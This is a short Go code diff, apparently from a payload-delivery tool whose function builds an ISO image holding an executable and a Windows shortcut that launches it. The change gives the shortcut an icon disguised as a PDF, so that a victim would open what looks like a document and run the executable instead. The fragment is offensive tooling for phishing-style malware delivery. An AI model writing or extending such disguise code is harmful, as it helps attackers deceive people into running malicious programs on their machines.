@@ -202,7 +202,8 @@ func BuildISOWithLNK(lnkName string, exeName string, exeData []byte) ([]byte, er
 	} else if !strings.Contains(exeName, ";") {
 		exeName += ";1"
 	}
-	lnkData, err := BuildLnkForExe(strings.TrimSuffix(exeName, ";1"))
+	trimmedExe := strings.TrimSuffix(exeName, ";1")
+	lnkData, err := BuildLnkForExeWithIcon(trimmedExe, DisguiseLnkIcon("pdf", trimmedExe))
 	if err != nil {
 		return nil, err
 	}
